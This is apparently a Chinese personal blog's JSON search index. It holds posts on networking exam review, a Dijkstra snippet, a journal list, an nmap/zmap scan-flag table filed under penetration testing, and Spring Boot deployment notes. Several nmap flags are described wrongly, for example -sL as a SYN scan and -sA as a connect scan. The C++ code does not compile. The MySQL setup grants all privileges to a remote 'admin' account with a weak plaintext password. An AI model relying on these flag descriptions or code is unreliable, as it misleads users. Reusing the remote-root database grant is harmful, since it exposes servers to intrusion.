Computing","slug":"Cloud-Computing","permalink":"http://waynamigo.github.io/tags/Cloud-Computing/"}]},{"title":"网络原理应用层复习","slug":"2019-01-07-应用层","date":"2019-01-06T16:00:00.000Z","updated":"2019-07-14T10:11:27.120Z","comments":true,"path":"2019/01/07/2019-01-07-应用层/","link":"","permalink":"http://waynamigo.github.io/2019/01/07/2019-01-07-应用层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 域名系统 DNS 文件传送协议 远程终端协议 TELNET 万维网 WWW 电子邮件 动态主机配置协议 DHCP P2P 应用 #总结 国家顶级域名 nTLD 通用顶级域名 gTLD 基础结构域名 (infrastructure domain)，顶级域名只有一个,即 arpa 一个服务器所负责管辖的(或有权限的)范围叫区 (zone)。 每一个区设置相应的权限域名服务器,用来保存该区中的所有主机的域名到 IP 地址的映射。根域名服务器共有 13 套装置,不是 13 个机器 可靠性：DNS 域名服务器都把数据复制到几个域名服务器来保存,其中的一个是主域名服务器,其他的是辅助域名服务器域名服务器 根域名服务器 最高层次的域名服务器,也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址a.rootservers.netb.rootservers.net 顶级域名服务器 权限域名服务器 本地域名服务器域名的解析过程 主机向本地域名服务器的查询一般都是采用递归查询 本地域名服务器向根域名服务器的查询通常是采用迭代查询。高速缓存 每个域名服务器都维护一个高速缓存* ,存放最近用过的名字以及从何处获得名字映射信息的记录 文件传输 文件传送协议 FTP (File Transfer Protocol) 提供交互式的访问工作步骤 打开熟知端口(端口号为 21),使客户进程能够连接上。 等待客户进程发出连接请求。 启动从属进程来处理客户进程发来的请求。 回到等待状态,继续接受其他客户进程发来的请求。控制连接和数据连接控制连接在整个会话期间一直保持打开，实际用于传输文件的是“数据连接”超媒体超文本","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理运输层复习","slug":"2019-01-06-传输层","date":"2019-01-05T16:00:00.000Z","updated":"2019-07-14T12:18:02.939Z","comments":true,"path":"2019/01/06/2019-01-06-传输层/","link":"","permalink":"http://waynamigo.github.io/2019/01/06/2019-01-06-传输层/","excerpt":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测","text":"运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测 用户数据报协议 UDP 传输控制协议 TCP 可靠传输的工作原理 TCP 报文段的首部格式 TCP 的流量控制、拥塞控制 TCP 的运输连接管理 TCP UDP 传输的数据单位：运输协议数据单元 TPDU (Transport Protocol Data Unit) 用户数据报协议UDP (User Datagram Protocol) 无连接 ├── 在传送数据之前不需要先建立连接 ├── 对方的运输层在收到 UDP 报文后,不需要给出任何确认。 └── 不提供可靠交付与IP数据报的区别：IP需要经过存储转发过程、UDP在运输层的端到端（进程）的逻辑信道中传送，只比IP数据报服务多了 复用分用 差错检测特点 UDP 是无连接的,发送数据之前不需要建立连接,因此减少了开销和发送数据之前的时延 UDP 使用尽最大努力交付,即不保证可靠交付 UDP 是面向报文的,UDP 一次交付一个完整的报文。 UDP 没有拥塞控制 UDP 支持一对一、一对多、多对一和多对多的交互通信,全双工 UDP 的首部开销小,只有 8 个字节,比TCP 的 20 个字节的首部要短。 传输控制协议 TCP (Transmission Control Protocol) 面向连接的运输层协议 TCP 连接只能有两个端点 提供可靠交付 提供全双工通信 面向字节流特点根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节(UDP 发送的报文长度是应用进程给出的) 可靠传输 停止等待协议 连续ARQ协议 123456789发送方维持的发送窗口,它的意义是:位于发送窗口内的分组都可连续发送出去,而不需要等待对方的确认。这样,信道利用率就提高了。连续 ARQ 协议规定,发送方每收到一个确认,就把发送窗口向前滑动一个分组的位置。接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认,而是对按序到达的最后一个分组发送确认,这样就表示:到这个分组为止的所有分组都已正确收到了。 确认丢失不必重传 不能向发送方反映出接收方已经正确收到的所有分组的信息 GBN重传 可以在连续收到好几个正确的确认帧后，才对最后一个数据帧发确认信息 这就是说，对某一数据帧的确认就表明该数据帧和这以前所有的数据帧均已正确无误地收到了。 后退N帧协议的接受窗口为1，可以保证按序接受数据帧。若采用n个比特对帧编号，则其发送窗口的尺寸Wt应满足：1&lt;=Wt&lt;=2^n-1 ACK(n+1)表示对第n号帧的确认，表明接受方已正确收到第n帧及以前的所有帧 例题：数据链路层采用了后退N帧(GBN)协议，发送方已经发送了编号为0～7的帧。当计时器超时时，若发送方只收到0、2、3号帧的确认，则发送方需要重发的帧数是( )。 1解析：根据后退N帧协议，接收方的窗口为“1”，如果发送方收到了3号帧的确认，则说明0、1、2、3号帧都已经发送成功，所以只需要重发4、5、6、7号帧即可。 TCP可靠重传 字节为单位的滑动窗口 1234567891011121314151617181920发送缓存：存放①发送应用程序传送给发送方 TCP 准备发送的数据 ②TCP 已发送出但尚未收到确认的数据* 超时重传时间* 选择确认SACK## TCP流量控制出现拥塞的原因:∑对资源需求 &gt; 可用资源* 增加资源不能解决拥塞，重传也不行，反而可能加剧* 拥塞控制：为了防止过多数据注入到网络中，一个全局性的过程* 流量控制：点对通信量的控制，一个端到端的过程，抑制发送端发送数据的速率,以便使接收端来得及接收开环控制、闭环控制。### tcp拥塞控制方法（闭环控制TCP发送方维持一个拥塞窗口 CWND(Congestion Window)*判断方式 有两个：** 使用**重传定时器**定时，若超时，重传；* 收到三个重复的ACK算法有四种，慢开始，&lt;blue&gt;拥塞避免&lt;/blue&gt;、快重传、快恢复* 拥塞窗口 cwnd 设置：最大报文段 SMSS 窗口数值* 慢开始门限 ssthresh(状态变量):防止拥塞窗口cwnd 增长过大引起网络拥塞。 当 cwnd &lt; ssthresh 时,使用慢开始算法。当 cwnd &gt; ssthresh 时,停止使用慢开始算法而改用拥塞避免算法。当 cwnd = ssthresh 时,既可使用慢开始算法,也可使用拥塞避免算法。 * 3ACK 拥塞避免，变成一半，然后拥塞避免，线性增加 * 超时 cwnd=1，慢开始，从1开始增加 ### 快重传：让发送方尽早知道发生了个别报文段的丢失 发送方只要一连收到三个重复确认,就知道接 收方确实没有收到报文段,因而应当立即进行 重传(即“快重传”),这样就不会出现超时, 发送方也不就会误认为出现了网络拥塞 {% image /img/FN.png '' '' %} ## TCP三次握手 发送链接请求报文段 * A ---------------------------------------- B * A发请求报文段，同步位SYN=1，选择序号seq=x表示第一个数据字节的序号为x * B发确认报文段，同步位SYN=1，确认位ACK=1，确认号ack=x+1，自己的数据序号seq=y * A发确认报文段，确认位ACK=1，数据序号seq=x+1，确认号ack=y+1 发送链接释放报文段 * A ---------------------------------------- B * A发请求报文段，FIN=1，选择序号seq=u * B发确认报文段，ACK=1，确认号ack=u+1，数据序号seq=v，A半关闭 * B发确认报文段，FIN=1，ACK=1，确认号ack=u+1，数据序号seq=w * A发确认报文段，ACK=1，确认号ack=w+1，数据序号seq=u+1，A关闭 **其中，A 必须等待 2MSL 的时间** * 保证 A 发送的最后一个 ACK 报文段能够到达 B。 * A 在发送完最后一个 ACK 报文段后,再经过时间 2MSL,就可以使本连接持续的 时间内所产生的所有报文段,都从网络中消失。这样就可以使下一个新的连接中不会出现这种 旧的连接请求报文段。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理网络层复习","slug":"2019-01-05-网络层复习","date":"2019-01-04T16:00:00.000Z","updated":"2019-07-14T12:17:38.265Z","comments":true,"path":"2019/01/05/2019-01-05-网络层复习/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-网络层复习/","excerpt":"限于IP层","text":"限于IP层 网络层向运输层提供的服务 面向连接 无连接IP协议123* 地址解析协议 ARP(Address Resolution Protocol)** * 网际控制报文协议 ICMP(Internet Control Message Protocol)*** 网际组管理协议 IGMP(Internet Group Management Protocol)** 互联时使用中间设备 物理层中继系统:转发器 (repeater)。 数据链路层中继系统:网桥 或 桥接器 (bridge)。 网络层中继系统:路由器 (router)。 网桥和路由器的混合物:桥路器 (brouter)。 网络层以上的中继系统:网关 (gateway)。IP地址分类 A B C三类*123456网络号|主机号 一共32位IPv6 128位IP 地址 ::= &#123; &lt;网络号&gt;, &lt;主机号&gt;&#125;A类地址 8 ，24 [最大可指派网络126 (2^7 -1 -1)]B类地址 16，16 [最大可指派网络(2^14 -1 -1)]C类地址 24, 8 [最大可指派网络(2^21 -1 -1)] IP地址与硬件地址报文、数据帧的区别 其他分类方式 子网划分 构成超网 ARP协议,解决同一个局域网的主机或路由器的IP：MAC问题 不管网络层使用的是什么协议,在实际网络的链路上传送数据帧时,最终还是必须使用硬件地址。 ARP 高速缓存 (ARPcache),里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。格式 &lt; IP address;MAC address;TTL &gt; TTL (Time To Live):地址映射有效时间 。 12345存放最近获得的 IP 地址到 MAC 地址的绑定,以减少 ARP 广播的数量。为了减少网络上的通信量,主机 A 在发送其ARP请求分组时,就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。当主机 B 收到 A 的 ARP 请求分组时,就将主机 A的这一地址映射写入主机 B 自己的 ARP高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 ARP请求分组包含发送方硬件地址 / 发送方IP 地址/目标方硬件地址(未知时填 0)/ 目标方IP 地址。 本地广播 ARP 请求 ARP 响应分组 包含发送方硬件地址/发送方IP地址/目标方硬件地址/目标方 IP 地址。 IP数据报分片数据报字段格式 转发过程：根据IP数据报的目的地址就可以确定下一跳路由器分组转发算法12345678910(1) 从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。(2) 若网络 N 与此路由器直接相连,则把数据报直接交付目的主机D;否则是间接交付,执行(3)。(3) 若路由表中有目的地址为 D 的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由器;否则,执行(4)。(4) 若路由表中有到达网络 N 的路由,则把数据报传送给路由表指明的下一跳路由器;否则,执行(5)。(5) 若路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由器;否则,执行(6)。(6) 报告转发分组出错。 划分子网从 主机号借用几位 划分子网号 IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}与上述转发过程不同点：121)路由器在收到 IP 数据报后,再按目的网络号 net-id 和子网号 subnet-id 找到目的子网2)通过子网掩码与IP地址进行&amp;操作，匹配，则说明子网掩码代表的这个子网就是目的网络。 CIDR 无分类编址 CIDR，IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;},中间使用符号‘/’来表示网络前缀构成超网路由聚合 有利于减少路由器之间选择的次数，从而提高性能。 CIDR记法 0 可以省略 最长前缀匹配原因：使用 CIDR 时,路由表中的每个项目由“网络前缀”和“下一跳地址”组成。在查找路由表时可能会得到不止一个匹配结果方案：在匹配结果中选择最长网络前缀的路由。 ICMP 报文格式 ICMP首部检验和 路由选择协议 内部网关协议 RIP ———| 内部网关协议 OSPF ———|–IGP 外部网关协议 BGP 将路由选择协议传递到另一个自制系统中使用4种报文打开 更新 保活 keepalive 通知 notification RIP(1)仅和相邻路由器交换信息。(2)交换的信息是当前本路由器所知道的全部信息,即自己的路由表。(3)按固定的时间间隔交换路由信息,例如,每隔30秒。当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息。 隧道技术 在 IPv6 数据报要进入IPv4网络时,把 IPv6 数据报封装成为 IPv4 数据报,整个的 IPv6 数据报变成了 IPv4 数据报的数据部分。 当 IPv4 数据报离开 IPv4 网络中的隧道时,再把数据部分(即原来的 IPv6 数据报)交给主机的 IPv6 协议栈。 NAT技术 网络地址转换(Network Address Translation)解决：在专用网上使用专用地址的主机如何与互联网上的主机通信(并不需要加密)的问题 123456789内部主机 A 用本地地址 IP A 和互联网上主机 B 通信所发送的数据报必须经过 NAT 路由器。NAT 路由器将数据报的源地址 IP A 转换成全球地址IP G ,并把转换结果记录到NAT地址转换表中,目的地址 IP B 保持不变,然后发送到互联网。NAT 路由器收到主机 B 发回的数据报时,知道数据报中的源地址是 IP B 而目的地址是 IP G 。根据 NAT 转换表,NAT 路由器将目的地址 IP G 转换为IP A ,转发给最终的内部主机 A。","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"网络原理物理层链路层复习","slug":"2019-01-05-物理层链路层","date":"2019-01-04T16:00:00.000Z","updated":"2019-07-14T12:17:14.600Z","comments":true,"path":"2019/01/05/2019-01-05-物理层链路层/","link":"","permalink":"http://waynamigo.github.io/2019/01/05/2019-01-05-物理层链路层/","excerpt":"限于物理层、链路层","text":"限于物理层、链路层 物理层屏蔽双绞线 STP (Shielded Twisted Pair)无屏蔽双绞线 UTP (Unshielded Twisted Pair)1室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。 多模光纤12可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤。 单模光纤12若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射,这样的光纤称为单模光纤 优点123456(1) 通信容量非常大。(2) 传输损耗小，中继距离长。(2) 抗雷电和电磁干扰性能好。(3) 无串音干扰，保密性好。(4) 体积小，重量轻。TIPS:光纤应用于：**企业网络 FTTH 和访问网络 长途网络 水下网络** 自由空间称为“非导引型传输媒体”。短波通信（即高频通信）主要是靠【电离层】的反射，但短波信道的通信质量较差，传输速率低微波在空间主要是直线传播 传统微波：地面微波接力通信 、卫星通信 宽带接入技术：有线宽带接入 无线宽带接入 非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术12345678910用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务特点：上行和下行带宽做成不对称的(上行指从用户到 ISP，而下行指从 ISP 到用户)。ADSL 在用户线（铜线）的两端各安装一个ADSL 调制解调器。我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。（这里的“多音调”就是【“多载波”或“多子信道”】的意思。DMT 调制技术采用【频分复用】的方法ADSL 采用【自适应调制技术】使用户线能够传送尽可能高的数据率，但【不能保证固定的数据率】第二代ADSL【无缝速率自适应技术 SRA (Seamless Rate Adaptation)】HFC网使用【模拟光纤技术】【电缆调制解调器】是为【 HFC 网】而使用的调制解调器 数据链路层链路层使用的信道 :点对点信道、广播信道链路&lt;通路 1234数据（逻辑）链路 (data link) 除了【物理线路】外，还必须有【通信协议】来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。一般的适配器都包括了【数据链路层和物理层】这两层的功能。 数据链路层协议要解决的基本问题【封装成帧】【透明传输】【差错控制】 ①封装成帧，在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。作用：确定帧的界限【帧定界】。—帧定界符SOH_DATA_EOT（end of transmission） ②透明传输：如果数据中的某个字节的二进制代码恰好和SOH或EOT一样数据链路层就会错误地“找到帧的边界” 123456解决方法：【字节填充 (byte stuffing)】或【字符填充(character stuffing)】。 1发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。2接收端的数据链路层在将数据送往网络层之前删除插入的转义字符3如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个 ③差错检测：在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1在一段时间内，传输错误的比特占所传输比特总数的比率称为【误码率 BER (Bit Error Rate)】。 循环冗余检验CRC计算冗余码，余数作为FCS【帧检验序列】 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并不是获得 FCS 的唯一方法 “无比特差错”与“无传输差错”是不同的概念。 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。 (2) 若余数 R！=0，则判定这个帧有差错，就丢弃。数据链路层的CRC检验可以实现【无比特差错】， 但是【不可靠传输】【不能确定是哪个比特出了差错】，只能做到【无差错接受】（无比特差错）要做到“可靠传输”（即发送什么就收到什么）就必须再加上【确认和重传机制】 PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容） 【面向字节，以字节为单位】 【一个将 IP 数据报封装到串行链路的方法】 【链路控制协议 LCP (Link Control Protocol)】 【网络控制协议 NCP (Network Control Protocol)】 【同步传输时，采用硬件完成【比特填充】，零比特传输：五个连续的1就填入一个0，接收时删除】 【异步传输时，使用特殊的字符填充法】MAC帧格式 PROTOCAL CSMA/CD局域网具有如下主要优点： 【具有广播功能】，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 【便于系统的扩展和逐渐地演变】，各设备的位置可灵活调整和改变。 【提高了系统的可靠性、可用性、残存性】","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"}]},{"title":"Dijstra","slug":"2018-12-11-dijstra","date":"2018-12-10T16:00:00.000Z","updated":"2019-07-14T10:10:41.295Z","comments":true,"path":"2018/12/11/2018-12-11-dijstra/","link":"","permalink":"http://waynamigo.github.io/2018/12/11/2018-12-11-dijstra/","excerpt":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了","text":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546struct Link&#123; int from,to,dist;&#125;;struct Node&#123; int d,u; bool operator &lt;(const HeapNode &amp; a) const&#123; return d &gt; a.d; &#125;&#125;;struct SubstrateNetwork&#123; int nodes; int links vector&lt;Link&gt; maplinks; bool isvisited[nodes+1]; vector&lt;int&gt; G[nodes+1]; int distance[nodes+1]; int p[nodes+1]; void init(int n)&#123; this-&gt;n = n; for(int i = 0;i &lt;= n;i++) G[i].clear(); memset(vis,false,sizeof vis); for(int i = 0;i &lt;= n;i++) p[i] = i; for(int i = 1;i &lt;= n;i++) d[i] = INF; &#125; void dijstra(int s)&#123; priority_queue&lt;Node&gt; q; q.push(Node&#123;0,s&#125;); distance[s] = 0; while(!q.empty())&#123; Node temp = q.top(); q.pop(); int u = temp.u; if(isvisited[u]) continue; isvisited[u]=true; for(int i=0;i&lt;G[u].size();i++)&#123; Link e = maplinks[G[u][i]]; if(distance[e.to] &gt; distance[u] + e.dist)&#123; distance[e.to] = distance[u] + e.dist; p[e.to] = u; q.push(HeapNode&#123;distance[e.to],e.to&#125;); &#125; &#125; &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"一些网页链接","slug":"2018-12-08-网页链接","date":"2018-12-07T16:00:00.000Z","updated":"2021-07-16T13:49:57.142Z","comments":true,"path":"2018/12/08/2018-12-08-网页链接/","link":"","permalink":"http://waynamigo.github.io/2018/12/08/2018-12-08-网页链接/","excerpt":"网络原理相关期刊","text":"网络原理相关期刊 顶级期刊名称：ieee network主页网址：ieee network 名称：journal of network and computer applications主页网址：journal of network and computer applications 名称：ieee-acm transactions on networking主页网址：ieee-acm transactions on networking 名称：Ad Hoc Networks主页网址：Ad Hoc Networks 名称：cluster computing-the journal of networks software tools and applications主页网址：cluster computing-the journal of networks software tools and applications 名称：Computer Networks主页网址：Computer Networks 名称：Optical Switching and Networking主页网址：Optical Switching and Networking 名称：Mobile Networks and Applications主页网址：Mobile Networks and Applications 名称：Wireless Networks主页网址：Wireless Networks 名称：Networks主页网址：Networks 名称：Journal of Network and Systems Management主页网址：Journal of Network and Systems Management 顶级会议：名称：acm sigcomm主页网址：acm sigcomm 名称: ieee infocom主页网址：ieee infocom","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"url","slug":"url","permalink":"http://waynamigo.github.io/tags/url/"}]},{"title":"nmap zmap使用","slug":"2018-12-01-nmap&zmap","date":"2018-11-30T16:00:00.000Z","updated":"2019-07-14T12:16:27.641Z","comments":true,"path":"2018/12/01/2018-12-01-nmap&zmap/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-nmap&zmap/","excerpt":"nmap 和 zmap的参数表，端口嗅探","text":"nmap 和 zmap的参数表，端口嗅探 参数表 参数 功能 -sL TCP SYN -sT Connect -sA ACK -sW Window -sM Maimon scans -sU UDP scan -sN TCP NULL -sF FIN -sX Xmax scans -sI host:probeport] zombie host scan -sY SCTP INIT -sZ Cookie-echo scans -sO IP protocol scan -b FTPserver FTP bounce scan 主机扫描 参照的详解文章[https://www.cnblogs.com/nmap/p/6232969.html] 参数 功能 -sL TCP SYN -sn Ping Scan - disable port scan（测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态） -sS 发送SYN包到远程主机，但不会产生任何会话，目标主机不会把连接记入系统日志。（为了防止对方判断为扫描攻击，目前挺多加防服务器直接会把扫自己端口的的ip拉黑） -sA Connect，探测主机是否开机 -PE Connect -PS80 ACK -PR Window -Pn 无ping扫描 -sP 快速ping，扫描本地局域网有那些机器，或者直接可以用前缀式表示类似于x.x.x.0/24","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"sniffer","slug":"sniffer","permalink":"http://waynamigo.github.io/tags/sniffer/"}]},{"title":"映射过程描述","slug":"2018-12-01-映射过程描述","date":"2018-11-30T16:00:00.000Z","updated":"2019-07-14T10:07:17.311Z","comments":true,"path":"2018/12/01/2018-12-01-映射过程描述/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-映射过程描述/","excerpt":"虚拟网络映射算法的节点、链路映射一般过程","text":"虚拟网络映射算法的节点、链路映射一般过程 映射过程123456789for(request:requestList)&#123; 映射成功标记 flag ① flag = 节点映射结果 if(falg) 节点资源分配 执行②部分 else 本组request映射失败 ② flag = 链路映射结果 if(falg) 链路资源分配 else 本组request映射失败&#125; 节点映射过程12345678910111213排序物理网络、网络请求的节点;//每一次按改进的H值（加入负载均衡系数后）对物理网络进行排序for( vn_node : vn_nodes)&#123;//对每一个排序后的虚拟节点 for(遍历物理节点)&#123; if(物理节点节点剩余CPU &gt; 虚拟节点CPU需求)&#123; 存储映射结果，跳出for循环，映射下一个节点 &#125; if(物理节点遍历结束)&#123; 映射失败,返回false &#125; &#125;&#125;节点映射成功，分配物理节点资源 链路映射过程123456789101112for(vn_link :vn_links)&#123;//对每一个request的链路请求 取出链路需求带宽，起、止节点id 根据起止节点id(from,to)查找最短路径 floyd if(finded)&#123; //找到链路后验证带宽 if(链路需求带宽 &gt; 物理链路剩余带宽) 映射失败; else 将这一条链路加入resultLinks（链路映射最终结果） &#125;else&#123; return false;//链路不通，映射失败 &#125; &#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"springboot+modleView+rmi调用自己写的天气预报的新闻系统","slug":"2018-11-30-newsSystem","date":"2018-11-29T16:00:00.000Z","updated":"2021-07-16T13:47:47.229Z","comments":true,"path":"2018/11/30/2018-11-30-newsSystem/","link":"","permalink":"http://waynamigo.github.io/2018/11/30/2018-11-30-newsSystem/","excerpt":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目","text":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目 newsSystem 先放上作业的代码地址 新闻系统 newsSystem 下面是在centos服务器上部署环境，建一个新数据库用户进行管理创建数据库123456yum install mysql mysql-server mysql-develcreate user newsadmin;create database newsbase;grant all privileges on newsbase.* to newsadmin@localhost identified by'password';revoke all on *.* from 'admin'@'%';grant all on *.* to 'admin'@'%' identified by 'wdnm' 数据库用户名，密码在application.yml文件中配置 服务器环境123456yum install java-1.8.0-openjdk-devel安装maven到usr/local/apache-mavenexport MAVEN_HOME=/usr/local/apache-mavenexport PATH=$&#123;MAVEN_HOME&#125;/bin:$PATH服务器端Could not find or load main class org.apache.maven.wrapper.MavenWrapperMain错误解决：mvn io.takari:maven:wrapper 环境变量别写错mysql服务没启动的错误，很奇妙 123/etc/rc.d/init.d/mysqld status /etc/init.d/mysqld start 创建项目文件夹12mkdir /classdesignchmod 754 /classdesign 运行项目123nohup java -jar newsSystem.jar &gt; springbootinfo.out 2&gt;&amp;1 &amp;或nohup ./mvnw spring-boot:run &gt; springbootinfo.out 2&gt;&amp;1 &amp; 代码高亮测试1234567891011121314151617181920212223242526272829303132333435 @Controller public class PageController &#123; @Autowired UserService userService=new UserService(); @Autowired NewsService newsService=new NewsService(); boolean isadmin = false; private static Logger logger = Logger.getLogger(PageController.class); @RequestMapping(\"/login/\") public String login(@RequestParam(value = \"username\", defaultValue = \"null\") String name, @RequestParam(value = \"password\", defaultValue = \"null\") String password, Model model)&#123;//String username, String password,Model model try &#123; User user = userService.findUser(name,password); if (user!=null)&#123; model.addAttribute(\"user\",user); if(user.getId()==1)&#123; logger.info(\"admin status\"); isadmin=true; &#125; logger.info(\"login success:username=\"+name); return \"redirect:/newspage/\"; &#125;else&#123; model.addAttribute(\"msg\",\"nosuchuser\"); logger.info(\"login failed:no such user\"); // return \"success\"; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; latex math测试$$[\\begin{matrix} a&amp;b\\\\c&amp;d \\end{matrix}\\quad\\begin{pmatrix} a&amp;b\\\\c&amp;d \\end{pmatrix}\\quad\\begin{bmatrix} a&amp;b\\\\c&amp;d \\end{bmatrix}\\quad\\begin{Bmatrix} a&amp;b\\\\c&amp;d \\end{Bmatrix}\\quad\\begin{vmatrix} a&amp;b\\\\c&amp;d \\end{vmatrix}\\quad\\begin{Vmatrix} a&amp;b\\\\c&amp;d \\end{Vmatrix}\\quad]$$ 数据库内容 Tables_in_newsbase hibernate_sequence news user ——————–","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"springboot","slug":"springboot","permalink":"http://waynamigo.github.io/tags/springboot/"},{"name":"rmi","slug":"rmi","permalink":"http://waynamigo.github.io/tags/rmi/"}]}]}